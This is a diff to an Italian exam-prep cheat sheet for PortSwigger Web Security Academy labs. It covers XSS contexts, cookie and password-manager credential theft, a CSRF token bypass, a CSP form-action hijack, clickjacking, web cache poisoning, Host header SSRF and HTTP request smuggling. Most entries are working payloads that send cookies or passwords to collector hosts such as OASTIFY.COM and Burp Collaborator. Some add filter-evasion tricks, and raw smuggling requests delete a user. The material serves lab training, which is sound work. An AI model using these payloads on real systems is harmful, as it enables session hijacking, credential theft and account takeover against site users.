-- Segnale: il payload finisce dentro l'attributo `onclick`, il server HTML-decodifica l'attributo prima che il JS venga interpretato.
-- Soluzione: usare l'entità HTML `&apos;` al posto dell'apice: il browser la decodifica in `'` solo dopo il parsing HTML, bypassando i filtri lato server sull'apice letterale.
-- Payload: `&apos;-alert(document.domain)-&apos;`
-- Payload da esame (Burp Collaborator): `&apos;-document.location="https://YOUR-SUBDOMAIN.burpcollaborator.net/?c="+document.cookie-&apos;`
+- Segnale: il valore del campo "Website" viene riflesso dentro l'attributo `onclick` del link del nome autore (una URL JavaScript); il server HTML-encoda angle brackets e doppi apici ed escapa apice singolo e backslash.
+- Soluzione: usare l'entità HTML `&apos;` al posto dell'apice: il browser la decodifica in `'` solo dopo il parsing HTML, bypassando i filtri sull'apice letterale. Il valore va fornito come URL (prefisso `http://foo?`) così da restare un `href`/onclick valido.
+- Payload (nel campo "Website"):
+```
+http://foo?&apos;-alert(1)-&apos;
+```
+- Payload da esame (Burp Collaborator/OAST): al click sul nome autore, esfiltra il cookie.
+```
+http://foo?&apos;-fetch('https://OASTIFY.COM/?c='+document.cookie)-&apos;
+```
 - Link: [Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
 - Step: 1
 
 **12. Template literal con angle brackets, apici, backslash e backtick Unicode-escaped**
 
-- Segnale: il valore finisce dentro un template literal (backtick) usato con `${...}`; non serve chiudere nulla.
-- Soluzione: usare direttamente la sintassi `${...}` del template literal per eseguire codice.
-- Payload: `${alert(document.domain)}`
-- Payload da esame (Burp Collaborator): `${document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie}`
+- Segnale: il valore finisce dentro un template literal (backtick) che supporta `${...}`; angle brackets, apici singoli/doppi e backtick sono encodati, ma `${...}` no.
+- Soluzione: usare direttamente la sintassi `${...}` del template literal per eseguire codice; non serve chiudere nulla.
+- Payload:
+```
+${alert(1)}
+```
+- Payload da esame (Burp Collaborator/OAST): esegue l'esfiltrazione del cookie dentro il template.
+```
+${fetch('https://OASTIFY.COM/?c='+document.cookie)}
+```
+- Bypass filtri (esame): se i caratteri dell'URL del collector vengono bloccati, costruisci la stringa dell'URL con `String.fromCharCode(...)` (i codici ASCII dell'URL `https://OASTIFY.COM/?c=`), senza scrivere caratteri "sospetti".
+```
+${fetch(String.fromCharCode(/* codici ASCII di https://OASTIFY.COM/?c= */) + document.cookie)}
+```
 - Link: [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)
 - Step: 1
 
@@ -285,208 +535,296 @@ Il sink non è nella risposta HTTP ma nel JavaScript lato client: va trovato il 
 
 **13. Furto di cookie di sessione**
 
-- Segnale: trovi uno store XSS/reflected sfruttabile da remoto (via exploit server) e l'app non usa `HttpOnly` sul cookie di sessione.
-- Soluzione: iniettare script che manda `document.cookie` al tuo exploit server, poi sostituire il cookie nel tuo browser e impersonare la vittima.
-- Payload: `<script>fetch('https://TUO-EXPLOIT-SERVER/log?c='+document.cookie)</script>` consegnato alla vittima dall'exploit server
+- Segnale: XSS stored nei commenti del blog; una vittima simulata visualizza tutti i commenti dopo la pubblicazione e l'app non usa `HttpOnly` sul cookie di sessione.
+- Soluzione: iniettare uno script che manda `document.cookie` al collector (POST, `mode:'no-cors'`); fare "Poll now" in Collaborator per leggere il cookie, poi sostituirlo nel proprio browser (Proxy/Repeater) e impersonare l'admin (verifica su `/my-account`).
+- Payload (nel commento, con il tuo sottodominio Collaborator/OAST):
+```html
+<script>fetch('https://OASTIFY.COM',{method:'POST',mode:'no-cors',body:document.cookie});</script>
+```
+- Tip esame (cookie `HttpOnly`): se `document.cookie` arriva vuoto, il cookie di sessione è `HttpOnly` e non è rubabile via XSS; per dimostrare comunque il PoC dello stealer, imposta in console un cookie di test non protetto.
+```javascript
+document.cookie = "test=UnsecureCookieValue123";
+```
 - Link: [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
 - Step: 1
 
 **14. Furto di password da un password manager**
 
-- Segnale: la pagina ha (o puoi iniettare) un form di login; i password manager compilano automaticamente lo username e la password anche in campi iniettati via XSS.
-- Soluzione: iniettare un form/login fittizio con campo `username` e `password`, leggere i valori auto-compilati e inviarli al tuo server.
-- Payload: iniettare `<input name=username id=username><input type=password name=password id=password><img src=1 onerror="fetch('https://TUO-EXPLOIT-SERVER/log?u='+username.value+'&p='+password.value)">` (poi attendere l'autofill)
+- Segnale: XSS stored nei commenti; i password manager auto-compilano username e password anche in campi iniettati via XSS, e una vittima simulata visualizza i commenti.
+- Soluzione: iniettare un finto form di login; quando il manager auto-compila, l'evento `onchange` del campo password invia username e password al collector.
+- Payload (nel commento, con il tuo sottodominio Collaborator/OAST):
+```html
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://OASTIFY.COM',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">
+```
 - Link: [Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)
 - Step: 1
 
 **15. Bypassare le protezioni CSRF tramite XSS**
 
-- Segnale: l'app ha un token CSRF ma anche una funzione sensibile (es. cambio email) raggiungibile senza re-inserire la password, ed esiste un punto XSS nella stessa origine.
-- Soluzione: usare l'XSS per fare una richiesta fetch/XHR alla pagina che contiene il token CSRF, leggerlo dalla risposta (l'XSS permette comunicazione "a due vie", il CSRF classico no) e poi inviare la richiesta sensibile (es. cambio email) con quel token, infine reset password sull'email controllata.
-- Payload: script che fa `fetch('/my-account', {credentials:'include'})` per leggere il token, poi `fetch('/my-account/change-email', {method:'POST', body:'email=attacker@evil.com&csrf='+token, credentials:'include'})`
+- Segnale: XSS stored nei commenti; esiste una funzione di cambio email (`POST /my-account/change-email`, parametro `email`) protetta da un token anti-CSRF in un input nascosto `csrf`.
+- Soluzione: usare l'XSS per fare una richiesta a `/my-account`, estrarre il token CSRF dalla risposta con una regex (l'XSS permette comunicazione "a due vie", il CSRF classico no) e poi inviare la richiesta di cambio email con quel token.
+- Payload (nel commento):
+```html
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com');
+};
+</script>
+```
 - Link: [Exploiting XSS to bypass CSRF defenses](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
 - Step: 2
 
 ### E. Bypassare una Content Security Policy (CSP)
 
-**16. CSP molto restrittiva, con dangling markup attack**
+**16. CSP molto restrittiva — form hijacking (direttiva `form-action` mancante)**
 
-- Segnale: header `Content-Security-Policy` blocca `script-src` (niente JS eseguibile) ma la pagina riflette input HTML non sanificato; la policy spesso permette ancora richieste immagine/risorse esterne o richiede interazione utente.
-- Soluzione: poiché non puoi eseguire JS, inietti un tag "dangling" (es. un `<img>` o `<a>` con un attributo che resta aperto) che cattura tutto l'HTML successivo nella pagina (inclusi dati sensibili) fino al prossimo apice, e lo invia al tuo server quando la risorsa viene caricata o cliccata.
-- Payload: `<img src='https://TUO-EXPLOIT-SERVER/log?` (senza chiudere l'apice: tutto il markup seguente viene interpretato come query string e inviato al tuo server al load dell'immagine)
+- Segnale: una CSP stretta blocca l'esecuzione di JS iniettato (nessuno `script-src` sfruttabile), ma il parametro `email` di `/my-account` riflette HTML non sanificato e nella pagina c'è un `<form>` di cambio email con un token CSRF in un input nascosto. La CSP **non** ha la direttiva `form-action`, quindi il bersaglio di un form submit non è ristretto.
+- Soluzione: invece di eseguire JS, iniettare un `<button>` con `formaction` che punta all'exploit server (dirotta la submit del form esistente, portando con sé il token CSRF). Prima si usa `formmethod="get"` per far finire il token CSRF nella query string (così l'exploit server lo legge dall'URL); poi l'exploit server auto-costruisce un form POST verso `change-email` con quel token e lo invia. Il vettore va etichettato con la parola "Click" per indurre la vittima a cliccare. (Il campo email client-side si bypassa mettendo il payload dentro un indirizzo valido, es. `foo@bar">...`.)
+- Payload — cattura del token CSRF (iniezione nel parametro `email`, `formmethod=get` porta il `csrf` nell'URL dell'exploit server):
+```
+https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>
+```
+- Payload — script finale sull'exploit server (Body): se l'URL contiene già `csrf`, costruisce e invia il form POST di cambio email; altrimenti reindirizza la vittima all'URL che inietta il bottone per generare il token.
+```html
+<body>
+<script>
+const academyFrontend = "https://YOUR-LAB-ID.web-security-academy.net/";
+const exploitServer = "https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit";
+const csrf = new URL(location).searchParams.get('csrf');
+if (csrf) {
+    const form = document.createElement('form');
+    const email = document.createElement('input');
+    const token = document.createElement('input');
+    token.name = 'csrf'; token.value = csrf;
+    email.name = 'email'; email.value = 'hacker@evil-user.net';
+    form.method = 'post';
+    form.action = `${academyFrontend}my-account/change-email`;
+    form.append(email); form.append(token);
+    document.documentElement.append(form);
+    form.submit();
+} else {
+    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
+}
+</script>
+</body>
+```
 - Link: [Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)
-- Step: 1
-
-
-## Web cache poisoning — Stage tipico: 1
-
-**Come riconoscerla (generale):** cerca input *unkeyed* (header come `X-Forwarded-Host`, cookie, parametri) che influenzano la risposta ma non fanno parte della cache key; usa un cache buster (parametro o header univoco) per isolare i tuoi test, poi verifica se riesci a far cachare una risposta "avvelenata" che venga servita anche senza il tuo input malevolo (richiesta "pulita").
-
-### A. Difetti di design della cache (header/cookie unkeyed)
-
-**1. Con un header unkeyed**
-
-- Segnale: un header come `X-Forwarded-Host` viene riflesso in URL dinamici nella risposta (es. Open Graph image, script import) e non fa parte della cache key.
-- Soluzione: inviare un payload XSS/URL malevolo nell'header unkeyed con un cache buster nella query, verificare che venga riflesso e cachato, poi rifare la richiesta pulita (senza header malevolo, stesso cache buster) per confermare che venga servita la versione avvelenata.
-- Payload: `GET /?cb=123 HTTP/1.1` con `X-Forwarded-Host: a."><script>alert(1)</script>`
-- Payload da esame (Burp Collaborator): `GET /?cb=123 HTTP/1.1` con `X-Forwarded-Host: a."><script>document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie</script>`
-- Link: [Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)
-- Step: 1
-
-**2. Con un cookie unkeyed**
-
-- Segnale: un cookie (es. lingua preferita) determina il contenuto della risposta ma non è parte della cache key.
-- Soluzione: impostare un payload nel valore del cookie e far cachare la risposta risultante; chiunque visiti la stessa URL riceverà la versione avvelenata.
-- Payload: richiesta con `Cookie: language=<script>alert(1)</script>` e cache buster nella query
-- Payload da esame (Burp Collaborator): richiesta con `Cookie: language=<script>document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie</script>` e cache buster nella query
-- Link: [Web cache poisoning with an unkeyed cookie](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie)
-- Step: 1
-
-**3. Con più header combinati**
-
-- Segnale: nessun singolo header unkeyed basta da solo, ma la combinazione di due (es. `X-Forwarded-Proto` che genera un redirect + `X-Forwarded-Host` che ne determina il dominio) produce una risposta cacheable malevola.
-- Soluzione: combinare i due header unkeyed per far generare un redirect verso un dominio a tua scelta, e far cachare quella risposta.
-- Payload: `X-Forwarded-Proto: http` + `X-Forwarded-Host: evil-user.net` su una richiesta che normalmente genera un redirect HTTPS
-- Link: [Web cache poisoning with multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)
-- Step: 1
-
-**4. Targeted, con un header ignoto da scoprire**
-
-- Segnale: nessun header noto sembra unkeyed; serve scoprirne uno con Param Miner ("Guess headers"), e la risposta rivela info extra (es. header `Vary`, `Age`) utili a capire quando colpire la cache.
-- Soluzione: usare Param Miner per identificare l'header unkeyed nascosto, poi sfruttarlo come negli altri casi per iniettare un payload mirato (es. verso un sottoinsieme di utenti identificato dal `Vary`/User-Agent).
-- Payload: dipende dall'header scoperto (varia per lab, tipicamente un header custom poco comune) usato per iniettare XSS nella risposta cachata
-- Link: [Targeted web cache poisoning using an unknown header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header)
-- Step: 1
-
-### B. Difetti di implementazione della cache key
-
-**5. Query string non in chiave (unkeyed query string)**
-
-- Segnale: la cache ignora completamente la query string; una reflected XSS tramite parametro sembra "non funzionare" perché ricevi sempre la stessa risposta cachata.
-- Soluzione: usa un cache buster in un header keyed (es. `Cookie: cb=1`) per bypassare la cache e confermare la XSS, poi invia la richiesta con il payload nel parametro (senza cache buster) per avvelenare la risposta che tutti riceveranno visitando l'URL pulito.
-- Payload: `GET /?param=<script>alert(1)</script>` (senza query string la richiesta è comunque equivalente per la cache)
-- Payload da esame (Burp Collaborator): `GET /?param=<script>document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie</script>` (senza query string la richiesta è comunque equivalente per la cache)
-- Link: [Web cache poisoning via an unkeyed query string](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query)
-- Step: 1
-
-**5b. Parametro di query specifico non in chiave (unkeyed query parameter)**
-
-- Segnale: non tutta la query string è esclusa dalla cache key, ma solo parametri specifici (tipicamente di analytics/marketing, es. `utm_content`); il resto della query rimane keyed.
-- Soluzione: verificare se quel parametro escluso viene comunque passato a un gadget sfruttabile (es. riflesso senza encoding), e usarlo per iniettare il payload mantenendo invariata la cache key.
-- Payload: `GET /?tracking=123&utm_content=<script>alert(1)</script>`
-- Payload da esame (Burp Collaborator): `GET /?tracking=123&utm_content=<script>document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie</script>`
-- Link: [Web cache poisoning via an unkeyed query parameter](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)
-- Step: 1
-
-**6. Parameter cloaking**
-
-- Segnale: un parametro è escluso dalla cache key, ma cache e server fanno parsing diverso dei delimitatori (`?` vs `&`/`;`), permettendo di "nascondere" un payload dentro un parametro che la cache considera escluso.
-- Soluzione: costruire una query string dove un secondo `?` (invece di `&`) fa credere alla cache che tutto dopo sia un parametro escluso, mentre il server lo tratta come valore del primo parametro (che finisce in un gadget sfruttabile).
-- Payload: `GET /?example=123?utm_content=PAYLOAD` (la cache esclude dopo il secondo `?`, il server lo include nel valore di `example`)
-- Link: [Parameter cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)
-- Step: 1
-
-**7. Fat GET request**
-
-- Segnale: la cache key si basa solo sulla request line (metodo+URL), ma il server legge anche un body anche su richieste GET.
-- Soluzione: inviare una GET con un body contenente il parametro malevolo; la cache chiave rimane "pulita" (basata sull'URL) ma il server usa il valore dal body.
-- Payload: `GET /?param=innocent HTTP/1.1` con body `param=<script>alert(1)</script>`
-- Payload da esame (Burp Collaborator): `GET /?param=innocent HTTP/1.1` con body `param=<script>document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie</script>`
-- Link: [Web cache poisoning via a fat GET request](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)
-- Step: 1
-
-**8. URL normalization**
-
-- Segnale: una reflected XSS in un parametro sembra "inexploitable" perché il browser della vittima URL-encoda automaticamente i caratteri pericolosi nella richiesta che invierebbe; ma la cache normalizza (decodifica) l'input quando costruisce la cache key.
-- Soluzione: avvelenare la cache inviando TU (via Burp Repeater, senza passare dal browser) la richiesta con il payload XSS non codificato; la cache key normalizzata coinciderà con quella della richiesta URL-encoded che la vittima invierebbe visitando il link, quindi riceve la risposta avvelenata già eseguibile.
-- Payload: `GET /example?param="><script>alert(1)</script>` inviata direttamente (non URL-encoded) per avvelenare la cache key condivisa con `GET /example?param=%22%3e%3cscript%3e...`
-- Payload da esame (Burp Collaborator): `GET /example?param="><script>document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie</script>` inviata direttamente (non URL-encoded) per avvelenare la cache key condivisa con `GET /example?param=%22%3e%3cscript%3e...`
-- Link: [URL normalization](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization)
-- Step: 1
-
-
-## HTTP Host header attacks — Stage tipico: 1-2
-
-**Come riconoscerla (generale):** manda un `Host` arbitrario e verifica se la richiesta raggiunge comunque l'app (nessun "Invalid Host"); controlla se il valore viene riflesso in URL generati dinamicamente (reset password, redirect, import di script) o usato per instradare la richiesta a un backend interno.
-
-**1. Web cache poisoning via richieste ambigue (Host header)**
-
-- Segnale: il valore del Host header viene riflesso senza encoding in markup/URL della risposta, ma non c'è modo diretto di far inviare alla vittima un Host modificato (non è una XSS classica sfruttabile); la cache è presente (spesso application-level).
-- Soluzione: usare una richiesta ambigua (es. `Host` duplicato, URL assoluto nella request-line, header indentato) per far vedere al front-end un Host "pulito" (quindi cache key normale) mentre il back-end usa il tuo Host malevolo per generare la risposta; se la risposta viene cachata, tutti gli utenti che richiedono quella pagina ricevono la versione avvelenata.
-- Payload: `GET / HTTP/1.1` con due header `Host:` (uno pulito per il routing front-end, uno malevolo che il back-end usa per generare la risposta, es. import di script)
-- Link: [Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)
-- Step: 1
-
-**2. Routing-based SSRF**
-
-- Segnale: un load balancer/reverse proxy interno instrada le richieste al backend corretto basandosi sul Host header senza validarlo; impostando un Host arbitrario (es. il tuo Burp Collaborator) ricevi una DNS lookup, confermando che puoi far instradare la richiesta altrove.
-- Soluzione: una volta confermato il controllo sul routing, usare il Host header per raggiungere sistemi interni non pubblicamente accessibili (brute-force di IP privati tipici, es. `192.168.0.0/16`) ed estrarre dati o funzionalità riservate.
-- Payload: `GET /admin HTTP/1.1` con `Host: 192.168.0.X` (iterare sugli IP privati fino a trovare il pannello interno)
-- Link: [Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)
-- Step: 1
-
-**3. SSRF via parsing errato della richiesta**
-
-- Segnale: un reverse proxy custom costruisce l'URL upstream concatenando `http://backend-server` con il path della request-line, senza validare correttamente il carattere iniziale del path.
-- Soluzione: sfruttare un path che inizia con `@` invece di `/`: la libreria HTTP interpreta tutto prima di `@` come credenziali utente nell'URL, facendo puntare la richiesta a un host completamente diverso scelto da te.
-- Payload: `GET @private-intranet/admin HTTP/1.1` (diventa `http://backend-server@private-intranet/admin`, cioè una richiesta verso `private-intranet`)
-- Link: [SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)
-- Step: 1
-
-**4. Bypass della validazione dell'host tramite attacco sullo stato della connessione**
-
-- Segnale: il server valida rigorosamente solo la *prima* richiesta ricevuta su una connessione HTTP/1.1 riutilizzata, assumendo (erroneamente) che il Host sia identico per tutte le richieste successive sulla stessa connessione.
-- Soluzione: usando Burp Repeater in modalità "send group in sequence (single connection)", invia prima una richiesta innocua con Host valido (che passa la validazione e stabilisce/riutilizza la connessione), poi sulla stessa connessione una seconda richiesta con un Host malevolo che non viene più validato.
-- Payload: 1ª richiesta: `GET / HTTP/1.1` con `Host: TARGET` (valida); 2ª richiesta sulla stessa connessione: `GET /admin HTTP/1.1` con `Host: evil-value` (non validata, usata dal routing/logica a valle)
-- Link: [Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)
 - Step: 2
 
+
+## Clickjacking — Stage tipico: 1-2
+
+**Come riconoscerla (generale):** verifica che la pagina target NON invii `X-Frame-Options` (o lo imposti in modo permissivo) e non abbia una CSP con `frame-ancestors`; costruisci una pagina decoy che carica il target in un `<iframe>` quasi trasparente (`opacity` vicino a 0) sovrapposto esattamente a un elemento "esca" cliccabile, usando `position`/`z-index` per allineare i due layer.
+
+**1. Exploiting clickjacking per scatenare un DOM-based XSS**
+
+- Segnale: esiste un punto XSS attivabile con un click (es. il parametro `name` del form di feedback riflette `<img src=1 onerror=...>`) e la pagina è frammabile (nessun `X-Frame-Options`/`frame-ancestors`).
+- Soluzione: nel template, l'`iframe` punta all'URL che contiene già il payload XSS (col fragment `#feedbackResult` per allineare il bottone "Submit feedback"); un `<div>` esca ("Click me") è sovrapposto esattamente sopra il bottone grazie a `position`/`z-index`, con l'iframe reso quasi trasparente (`opacity` 0.1 per allineare, poi 0.0001 per l'attacco).
+- Payload (exploit server; sostituisci `YOUR-LAB-ID`, regola i pixel, poi "Deliver to victim"):
+```html
+<style>
+    iframe {
+        position:relative;
+        width:500px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:610px;
+        left:80px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
+```
+- Payload da esame (Burp Collaborator/OAST): sostituisci `print()` con un cookie-stealer nell'`onerror`.
+```html
+<iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=fetch('https://OASTIFY.COM/?c='+document.cookie)>&email=a@b.c&subject=test&message=test#feedbackResult"></iframe>
+```
+- Link: [Exploiting clickjacking vulnerability to trigger DOM-based XSS](https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss)
+- Step: 1
+
+**2. Multistep clickjacking**
+
+- Segnale: l'azione sensibile (es. "Delete account") è protetta da token CSRF **e** da un dialog di conferma ("Yes") — serve far cliccare alla vittima due elementi in sequenza.
+- Soluzione: due `<div>` esca ("Click me first"/"Click me next") sovrapposti con coordinate diverse sullo stesso `iframe` di `/my-account`: il primo allineato sul "Delete account", il secondo sul "Yes" della conferma. Si regola l'opacità (0.1 per allineare, 0.0001 per l'attacco).
+- Payload (exploit server; sostituisci `YOUR-LAB-ID`, regola le due coppie di coordinate):
+```html
+<style>
+    iframe {
+        position:relative;
+        width:500px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    .firstClick, .secondClick {
+        position:absolute;
+        top:330px;
+        left:50px;
+        z-index: 1;
+    }
+    .secondClick {
+        top:285px;
+        left:225px;
+    }
+</style>
+<div class="firstClick">Click me first</div>
+<div class="secondClick">Click me next</div>
+<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
+```
+- Link: [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)
+- Step: 2
 
 ## HTTP request smuggling — Stage tipico: 1-2
 
 **Come riconoscerla (generale):** l'app ha un'architettura a catena front-end (load balancer/reverse proxy) → back-end, con connessioni riusate; il sospetto nasce quando una richiesta con *sia* `Content-Length` *sia* `Transfer-Encoding: chunked` viene gestita in modo ambiguo. Metodo base di detection: invia una richiesta con `Content-Length` corto rispetto al corpo reale + `Transfer-Encoding: chunked` malformato, e osserva un **timeout** (il back-end aspetta più dati) o una **risposta differenziale** (status 404 su una richiesta "normale" successiva, segno che è stata preceduta da bytes smugglati).
 
-### A. CL.TE / TE.CL / TE.TE classici (HTTP/1)
+### A. CL.TE / TE.CL / TE.TE / CL.0 (HTTP/1)
+
+> In tutti questi lab si invia la richiesta **due volte** (la 1ª "avvelena", la 2ª riceve l'effetto). Per i casi TE.CL/TE.TE va disattivato **Repeater → Update Content-Length** e serve il `\r\n\r\n` finale dopo lo `0`.
 
 **1. CL.TE di base**
 
-- Segnale: il front-end usa `Content-Length`, il back-end usa `Transfer-Encoding`; un corpo con un chunk `0` seguito da byte extra viene troncato dal front-end ma il back-end tratta quei byte extra come l'inizio della richiesta successiva.
-- Soluzione: inviare `Content-Length` che copre solo fino al chunk terminatore `0`, con il testo "smugglato" dopo, così il back-end lo accoda alla richiesta successiva sulla stessa connessione.
-- Payload: `POST / HTTP/1.1\r\nHost: VULN\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED`
+- Segnale: il front-end usa `Content-Length`, il back-end usa `Transfer-Encoding`; il front-end rifiuta metodi diversi da GET/POST. Obiettivo: far apparire il metodo `GPOST` nella richiesta successiva.
+- Soluzione: `Content-Length` che copre fino allo `0` + il byte `G` smugglato, che si fonde con la request-line successiva formando `GPOST`.
+- Payload (invia due volte → `Unrecognized method GPOST`):
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+```
 - Link: [HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
 - Step: 1
 
 **2. TE.CL di base**
 
-- Segnale: il front-end usa `Transfer-Encoding`, il back-end usa `Content-Length`; opposto del caso precedente.
-- Soluzione: codificare il corpo in chunked per il front-end (che lo elabora interamente) ma impostare un `Content-Length` basso così il back-end legge solo l'inizio e lascia il resto come richiesta successiva. In Burp Repeater disattivare "Update Content-Length".
-- Payload: `POST / HTTP/1.1\r\nHost: VULN\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n`
+- Segnale: il front-end usa `Transfer-Encoding`, il back-end usa `Content-Length`. Obiettivo: metodo `GPOST`.
+- Soluzione: corpo in chunked per il front-end; `Content-Length: 4` basso così il back-end legge solo il primo chunk. Disattiva "Update Content-Length".
+- Payload (due volte → `Unrecognized method GPOST`; includi il `\r\n\r\n` dopo lo `0` finale):
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+```
 - Link: [HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
 - Step: 1
 
 **3. TE.TE — offuscamento dell'header Transfer-Encoding**
 
-- Segnale: entrambi i server supportano `Transfer-Encoding`, ma uno dei due può essere indotto a ignorarlo tramite una leggera deviazione dalla specifica nel nome/valore dell'header.
-- Soluzione: provare varianti come `Transfer-Encoding: xchunked`, doppio header `Transfer-Encoding`, spazio/tab prima dei due punti, ecc., finché uno dei due server lo ignora mentre l'altro lo processa — poi si procede come in un CL.TE o TE.CL.
-- Payload: es. `Transfer-Encoding: chunked` + seconda riga `Transfer-Encoding: x` oppure `Transfer-Encoding\r\n: chunked`
+- Segnale: entrambi i server supportano `Transfer-Encoding`, ma gestiscono diversamente header duplicati; uno dei due può essere indotto a ignorare un secondo `Transfer-Encoding` offuscato.
+- Soluzione: inviare un `Transfer-Encoding` valido + un secondo offuscato (es. `Transfer-encoding: cow`): un server processa il primo, l'altro ignora entrambi → si ricade in un TE.CL. Disattiva "Update Content-Length".
+- Payload (due volte → `Unrecognized method GPOST`):
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+```
 - Link: [HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)
 - Step: 1
+
+**3b. CL.0 request smuggling**
+
+- Segnale: il back-end **ignora il `Content-Length`** su certi endpoint (tipicamente file statici sotto `/resources`), trattando il corpo come l'inizio di una nuova richiesta → desync "CL.0".
+- Soluzione: in Repeater raggruppare due richieste e usare "Send group in sequence (single connection)" con `Connection: keep-alive`; la prima richiesta (verso un path statico vulnerabile) porta nel corpo la richiesta smugglata verso `/admin/...`, che il back-end esegue sulla connessione. Prima si individua l'endpoint vulnerabile con un prefisso `GET /hopefully404`.
+- Payload (cancella carlos — invia il gruppo in sequenza su singola connessione):
+```
+POST /resources/images/blog.svg HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=YOUR-SESSION-COOKIE
+Connection: keep-alive
+Content-Length: CORRECT
+
+GET /admin/delete?username=carlos HTTP/1.1
+Foo: x
+```
+- Link: [CL.0 request smuggling](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling)
+- Step: 2
 
 ### B. Conferma via risposte differenziali
 
 **4. Conferma CL.TE via risposte differenziali**
 
-- Segnale: non puoi disturbare altri utenti; vuoi provare il CL.TE senza causare un vero smuggling permanente.
